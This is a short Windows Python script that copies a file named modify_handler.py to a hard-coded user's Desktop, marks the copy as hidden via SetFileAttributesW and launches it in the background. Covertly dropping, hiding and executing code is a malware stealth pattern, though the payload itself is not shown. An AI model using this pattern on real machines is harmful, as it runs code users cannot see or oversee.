import subprocess
import ctypes
import os


def main():
    file_to_copy = 'modify_handler.py'
    with open(file_to_copy, 'r') as file:
        script = file.read()

    parent_path = r'C:\Users\roykr\Desktop'
    filepath = os.path.join(parent_path, file_to_copy)

    if os.path.isfile(filepath):
        return
    
    with open(filepath, 'w') as file:
        file.write(script)

    ret = ctypes.windll.kernel32.SetFileAttributesW(filepath, 0x02)

    subprocess.Popen(["python", file_to_copy], cwd=parent_path)

if __name__ == "__main__":
    main()